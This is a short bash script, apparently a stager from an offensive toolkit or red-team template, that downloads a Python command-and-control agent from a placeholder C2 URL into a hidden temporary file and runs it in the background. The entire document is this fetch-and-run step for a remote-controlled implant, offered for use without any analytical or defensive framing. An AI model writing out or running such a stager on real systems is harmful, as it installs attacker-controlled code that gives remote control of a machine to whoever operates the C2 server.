#!/bin/bash
set -e
TMP=$(mktemp /tmp/.c2agent.XXXXXX.py)
curl -s -o "$TMP" "__C2_URL__/py"
python3 "$TMP" &
sleep 1
echo "[+] C2 agent started (PID $!)"
